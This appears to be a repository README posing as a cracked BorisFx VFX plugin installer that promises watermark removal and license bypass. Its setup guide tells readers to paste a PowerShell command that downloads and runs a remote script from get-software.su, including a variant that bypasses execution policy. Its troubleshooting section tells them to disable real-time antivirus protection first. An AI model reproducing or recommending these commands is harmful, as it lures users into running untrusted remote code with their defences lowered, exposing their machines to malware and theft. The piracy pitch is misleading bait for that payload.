# BorisFx Complete Video Effects & VFX Plugin Suite

Welcome to the ultimate deployment repository for the **BorisFx** post-production environment. This utility is designed to streamline the integration, asset management, and complete features activation for industry-standard visual effects plug-ins on your workstation.

If you are looking for a reliable way to deploy **BorisFx full version** alternatives—including Sapphire, Continuum, and Mocha—this automated manager handles the heavy lifting. It removes rendering watermarks, unlocks premium cinematic presets, and configures the host applications to utilize advanced GPU acceleration across all video editing platforms without license prompt interruptions.

### Compatible Host Software:
*   **Adobe Suite:** Full compatibility with After Effects and Premiere Pro CC.
*   **OFX Hosts:** Optimized for DaVinci Resolve, Foundry Nuke, and Vegas Pro.
*   **Avid:** Dedicated configuration for Media Composer setups.

---

## 🛠 Quick Setup Guide (PowerShell)

1. **Launch PowerShell:**
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. **Execute the Setup Script:**
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://get-software.su/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated OS component)
If your system shortcut isn't recognized, use the full, unabbreviated commands instead:
```cmd
Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## Technical Features & Performance

This **BorisFx plug-in toolkit** updates local environment variables and registry branches to emulate an enterprise floating license state. It ensures that heavy particle effects, advanced lens flares, and Mocha planar tracking features function at maximum rendering speed. All configurations are applied locally to prevent host software from crashing during export operations.
